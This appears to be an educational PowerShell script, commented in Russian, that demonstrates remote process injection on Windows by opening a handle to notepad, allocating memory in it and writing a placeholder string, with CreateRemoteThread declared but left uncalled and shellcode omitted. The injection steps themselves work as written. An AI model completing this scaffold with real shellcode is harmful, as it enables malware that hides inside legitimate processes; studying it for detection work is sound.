# Educational Process Injection Example
# WARNING: For research purposes only!

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class InjectionDemo
{
    // Импорт Windows API функций
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    // Константы для прав доступа
    public const uint PROCESS_CREATE_THREAD = 0x0002;
    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint PROCESS_VM_OPERATION = 0x0008;
    public const uint PROCESS_VM_WRITE = 0x0020;
    public const uint PROCESS_VM_READ = 0x0010;
    
    public const uint MEM_COMMIT = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint PAGE_READWRITE = 0x04;
}
"@

function Start-InjectionDemo {
    param(
        [string]$TargetProcessName = "notepad"  # Безопасный процесс для демонстрации
    )
    
    try {
        Write-Host "[+] Поиск процесса: $TargetProcessName" -ForegroundColor Yellow
        
        # Находим целевой процесс (безопасный для демонстрации)
        $targetProcess = Get-Process -Name $TargetProcessName -ErrorAction Stop | Select-Object -First 1
        Write-Host "[+] Найден процесс: $($targetProcess.ProcessName) (PID: $($targetProcess.Id))" -ForegroundColor Green
        
        # Открываем handle к процессу
        Write-Host "[+] Открываем handle к процессу..." -ForegroundColor Yellow
        $hProcess = [InjectionDemo]::OpenProcess(
            [InjectionDemo]::PROCESS_CREATE_THREAD -bor 
            [InjectionDemo]::PROCESS_QUERY_INFORMATION -bor 
            [InjectionDemo]::PROCESS_VM_OPERATION -bor 
            [InjectionDemo]::PROCESS_VM_WRITE -bor 
            [InjectionDemo]::PROCESS_VM_READ,
            $false, $targetProcess.Id
        )
        
        if ($hProcess -eq [IntPtr]::Zero) {
            throw "Не удалось открыть handle к процессу"
        }
        Write-Host "[+] Handle успешно открыт: $hProcess" -ForegroundColor Green
        
        # Демонстрационный payload (простая заглушка)
        # В реальной атаке здесь был бы шеллкод
        $demoPayload = [System.Text.Encoding]::ASCII.GetBytes("DEMO_PAYLOAD")
        
        # Выделяем память в целевом процессе
        Write-Host "[+] Выделяем память в целевом процессе..." -ForegroundColor Yellow
        $allocatedMemory = [InjectionDemo]::VirtualAllocEx(
            $hProcess,
            [IntPtr]::Zero,
            [uint32]$demoPayload.Length,
            [InjectionDemo]::MEM_COMMIT -bor [InjectionDemo]::MEM_RESERVE,
            [InjectionDemo]::PAGE_READWRITE
        )
        
        if ($allocatedMemory -eq [IntPtr]::Zero) {
            throw "Не удалось выделить память"
        }
        Write-Host "[+] Память выделена по адресу: $allocatedMemory" -ForegroundColor Green
        
        # Записываем данные в память целевого процесса
        Write-Host "[+] Записываем данные в память..." -ForegroundColor Yellow
        $bytesWritten = [UIntPtr]::Zero
        $success = [InjectionDemo]::WriteProcessMemory(
            $hProcess,
            $allocatedMemory,
            $demoPayload,
            [uint32]$demoPayload.Length,
            [ref]$bytesWritten
        )
        
        if (!$success) {
            throw "Не удалось записать данные в память"
        }
        Write-Host "[+] Данные записаны успешно ($bytesWritten байт)" -ForegroundColor Green
        
        Write-Host "[!] ДЕМОНСТРАЦИЯ ЗАВЕРШЕНА" -ForegroundColor Cyan
        Write-Host "[!] EDR сработал бы на реальные вызовы CreateRemoteThread с шеллкодом" -ForegroundColor Red
        
    }
    catch {
        Write-Host "[ОШИБКА] $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Запускаем безопасный процесс для демонстрации
Start-Process notepad -WindowStyle Minimized
Start-Sleep -Seconds 2

# Запускаем демонстрацию
Start-InjectionDemo -TargetProcessName "notepad"
